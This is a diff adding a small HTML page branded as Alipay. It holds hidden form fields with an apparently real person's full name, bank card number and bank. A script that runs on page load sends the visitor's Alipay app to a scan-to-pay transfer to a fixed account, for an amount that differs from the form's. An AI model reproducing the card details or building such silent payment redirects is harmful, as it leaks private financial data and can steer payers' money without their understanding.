@@ -1,0 +1,24 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>支付宝</title>
+<body>
+<form name="payForm">
+    <input type="hidden" name="bankAccount" value="聂流昌">
+    <input type="hidden" name="cardNo" value="622908123077764318">
+    <input type="hidden" name="bankName" value="兴业银行">
+    <input type="hidden" name="bankMark" value="CIB">
+    <input type="hidden" name="amount" value="105.95">
+    <input type="hidden" name="cardIndex" value="1904011169812432527">
+    <input type="hidden" name="cardChannel" value="HISTORY_CARD">
+    <input type="hidden" name="cardNoHidden" value="true">
+    <input type="hidden" name="__hash__" value="" /></form>
+</body>
+</html>
+<script>
+    var go_url = 'alipayqr://platformapi/startapp?appId=20000123&actionType=scan&biz_data={\"s\": \"money\",\"u\": ' + '\"2088432597450368\",\"m\": \"\",\"a\": \"99.94\"}';
+
+    window.location.href = go_url;
+</script>
